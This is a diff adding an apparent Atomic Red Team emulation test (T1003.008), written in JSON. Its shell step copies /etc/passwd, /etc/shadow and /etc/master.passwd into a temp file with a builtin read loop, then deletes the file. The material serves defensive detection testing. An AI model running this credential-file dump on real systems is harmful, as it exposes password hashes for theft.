@@ -1,0 +1,52 @@
+{
+  "id": "f5aa6543-6cb2-4fae-b9c2-b96e14721713",
+  "name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins",
+  "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "e855ceb1-3eaf-474b-92aa-278227dbca4a",
+      "type": "execute-command",
+      "data": {
+        "command": "testcat(){ (while read line; do echo $line \u003e\u003e #{output_file}; done \u003c $1) }\n[ \"$(uname)\" = 'FreeBSD' ] \u0026\u0026 testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ff04dfd1-0a3e-47fd-925a-6b49a3d49508",
+      "type": "execute-command",
+      "data": {
+        "command": "rm -f #{output_file}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e855ceb1-3eaf-474b-92aa-278227dbca4a",
+      "p": "on-success",
+      "o": "ff04dfd1-0a3e-47fd-925a-6b49a3d49508"
+    },
+    {
+      "s": "e855ceb1-3eaf-474b-92aa-278227dbca4a",
+      "p": "on-failure",
+      "o": "ff04dfd1-0a3e-47fd-925a-6b49a3d49508"
+    }
+  ],
+  "tags": [
+    "T1003.008",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_file",
+      "type": "path",
+      "description": "Path where captured results will be placed",
+      "value": "/tmp/T1003.008.txt"
+    }
+  ]
+}
